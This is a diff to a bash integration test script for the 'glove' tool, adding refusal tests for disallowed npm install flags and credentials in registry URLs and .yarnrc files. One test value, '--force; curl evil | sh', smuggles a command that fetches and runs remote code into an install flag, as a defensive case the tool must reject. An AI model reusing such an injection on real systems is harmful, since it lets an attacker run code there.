@@ -7,7 +7,7 @@
 # Playwright's baked Chromium must all work offline. A second session checks
 # Vibe (no node in its base; its hook keeps the image's python), session 4 a
 # lockfile that installs only with legacy-peer-deps (baked `.npmrc`, then
-# `install_flags`), and the plan-time refusals.
+# `install_flags`), and the plan-time refusals (incl. the flag allow-list).
 #
 # Usage:  bash tests/integration/test_toolchains.sh
 # Requires: docker (the build downloads Node, uv, Python, npm/PyPI packages and
@@ -198,6 +198,7 @@ refuse() {  # <name> <toolchains yaml> <expected message>
   echo '{"name":"x"}' > "$d/projects/nolock/package.json"
   echo x > "$d/projects/file"
   echo '//registry.example.com/:_authToken=not-a-real-token' > "$d/projects/nolock/.npmrc"
+  echo '"//registry.example.com/:_authToken" "not-a-real-token"' > "$d/projects/nolock/.yarnrc"
   printf 'glove: 3\ntemplate: test\nharness: pi\nextensions:\n  llm: {provider: llama.cpp, location: host, endpoint: "127.0.0.1:8080", model: test-model}\ntoolchains:\n%b' "$2" > "$d/glove-session.yml"
   out="$(COLUMNS=400 uv run --quiet --project "$ROOT" glove check "$d" 2>&1)"; rc=$?
   [ $rc -ne 0 ] && echo "$out" | grep -q "$3" && ok "refused: $1" || bad "$1 not refused (rc=$rc): $out"
@@ -207,8 +208,11 @@ refuse not-a-dir '  - {lang: node, version: "22.23.3", project: projects/file}\n
 refuse unknown-lang '  - {lang: ruby, version: "3.3.0"}\n' '`lang` must be one of'
 refuse no-version '  - {lang: python}\n' '`version` is required'
 refuse flag-injection '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, install_flags: ["--force; curl evil | sh"]}\n' 'not single long options'
+refuse flag-not-allowed '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, install_flags: ["--prefix=/work"]}\n' 'not allowed for `npm` `install`'
+refuse flag-url-credential '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, install_flags: ["--registry=https://tok@registry.example.com/"]}\n' 'carry URL credentials'
 refuse config-escape '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, config_files: [../.npmrc]}\n' 'not file names in the project'
 refuse config-credential '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, config_files: [.npmrc]}\n' 'carries a credential'
+refuse yarnrc-credential '  - {lang: node, version: "22.23.3", manager: yarn, project: projects/nolock, install: install, config_files: [.yarnrc]}\n' 'carries a credential'
 
 echo
 echo "toolchains: $PASS passed, $FAIL failed"
